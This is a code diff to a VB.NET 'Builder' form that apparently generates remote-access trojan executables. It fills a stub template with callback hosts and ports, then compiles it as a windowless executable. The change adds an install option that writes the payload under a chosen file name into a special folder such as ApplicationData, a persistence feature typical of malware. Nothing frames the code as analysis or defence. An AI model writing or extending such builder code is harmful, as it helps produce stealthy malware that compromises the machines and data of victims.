@@ -31,11 +31,21 @@ Public Class Builder
                 Stub = Replace(Stub, "%v4%", rand.Next(0, 10))
                 Stub = Replace(Stub, "%Guid%", Guid.NewGuid.ToString)
 
+
+                If CheckBox1.Checked Then
+                    If Not TextBox3.Text.EndsWith(".exe") Then
+                        TextBox3.Text = TextBox3.Text + ".exe"
+                    End If
+                    Stub = Replace(Stub, "%EXE%", TextBox3.Text)
+                    Stub = Replace(Stub, "%DIR%", ComboBox1.Text)
+                    Stub = Replace(Stub, "#Const INS = False", "#Const INS = True")
+                End If
+
                 Dim providerOptions = New Dictionary(Of String, String)
                 providerOptions.Add("CompilerVersion", "v4.0")
                 Dim CodeProvider As New VBCodeProvider(providerOptions)
                 Dim Parameters As New CodeDom.Compiler.CompilerParameters
-                Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
+                Dim OP As String = " /target:winexe /platform:anycpu /optimize+ /nowarn"
                 With Parameters
                     .GenerateExecutable = True
                     .OutputAssembly = o.FileName
@@ -75,6 +85,12 @@ Public Class Builder
             TextBox1.Text = "127.0.0.1,Dns.com"
         End If
         TextBox2.Text = String.Join(",", Settings.Ports.ToList)
+        For Each typeSpecialFolder In Environment.SpecialFolder.GetValues(GetType(Environment.SpecialFolder))
+            ComboBox1.Items.Add(typeSpecialFolder)
+            If typeSpecialFolder.ToString = "ApplicationData" Then
+                ComboBox1.Text = "ApplicationData"
+            End If
+        Next
     End Sub
 
     Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
@@ -94,5 +110,15 @@ Public Class Builder
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Exclamation)
         End Try
+    End Sub
+
+    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
+        If CheckBox1.Checked Then
+            TextBox3.Enabled = True
+            ComboBox1.Enabled = True
+        Else
+            TextBox3.Enabled = False
+            ComboBox1.Enabled = False
+        End If
     End Sub
 End Class
